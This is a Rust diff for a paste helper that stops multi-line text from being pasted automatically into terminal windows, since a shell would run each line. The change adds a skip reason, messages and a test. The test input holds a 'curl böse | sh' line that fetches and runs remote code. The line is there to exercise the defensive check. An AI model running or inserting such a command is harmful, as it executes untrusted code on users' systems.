@@ -2,6 +2,7 @@ use std::process::{Command, Stdio};
 
 use crate::clipboard;
 use crate::i18n::t;
+use crate::policy;
 use crate::window::{self, TargetWindow};
 
 /// Window classes that paste with Ctrl+Shift+V instead of Ctrl+V.
@@ -26,6 +27,9 @@ const TERMINAL_CLASSES: &[&str] = &[
 /// known to be in the clipboard.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Skip {
+    /// A shell runs every line it receives; multi-line text stays in the
+    /// clipboard so the user pastes it on purpose.
+    MultilineIntoTerminal,
     TargetNotFrontmost,
     ClipboardChanged,
     ClipboardUnreadable,
@@ -41,6 +45,7 @@ impl Skip {
 
     pub fn log_reason(self) -> &'static str {
         match self {
+            Self::MultilineIntoTerminal => "multiline-into-terminal",
             Self::TargetNotFrontmost => "target-not-frontmost",
             Self::ClipboardChanged => "clipboard-changed",
             Self::ClipboardUnreadable => "clipboard-unreadable",
@@ -50,6 +55,10 @@ impl Skip {
 
     pub fn message(self) -> &'static str {
         match self {
+            Self::MultilineIntoTerminal => t(
+                "Mehrzeiliger Text wird nicht in ein Terminal eingefügt",
+                "Multi-line text is not pasted into a terminal",
+            ),
             Self::TargetNotFrontmost => t(
                 "Zielfenster ist nicht mehr vorne",
                 "Target window is no longer in front",
@@ -74,6 +83,9 @@ impl Skip {
 pub fn paste_into(target: &TargetWindow, text: &str) -> Result<(), Skip> {
     if !valid_address(&target.address) {
         return Err(Skip::Unavailable);
+    }
+    if is_terminal(&target.class) && policy::is_multiline(text) {
+        return Err(Skip::MultilineIntoTerminal);
     }
     // Checked first, so every later skip can rely on the text still being
     // in the clipboard.
@@ -154,9 +166,12 @@ fn legacy_argument(target: &TargetWindow) -> String {
     )
 }
 
+fn is_terminal(class: &str) -> bool {
+    TERMINAL_CLASSES.contains(&class.to_ascii_lowercase().as_str())
+}
+
 fn paste_modifiers(class: &str) -> &'static str {
-    let class = class.to_ascii_lowercase();
-    if TERMINAL_CLASSES.contains(&class.as_str()) {
+    if is_terminal(class) {
         "CTRL SHIFT"
     } else {
         "CTRL"
@@ -229,5 +244,16 @@ mod tests {
         let mut window = target("foot");
         window.address = "0xzz".to_string();
         assert_eq!(paste_into(&window, "Hallo"), Err(Skip::Unavailable));
+    }
+
+    #[test]
+    fn multiline_text_stays_in_the_clipboard_for_terminals() {
+        let skip = paste_into(&target("Alacritty"), "echo eins\ncurl böse | sh");
+        assert_eq!(skip, Err(Skip::MultilineIntoTerminal));
+        assert!(!Skip::MultilineIntoTerminal.loses_clipboard());
+        assert_eq!(
+            Skip::MultilineIntoTerminal.log_reason(),
+            "multiline-into-terminal"
+        );
     }
 }
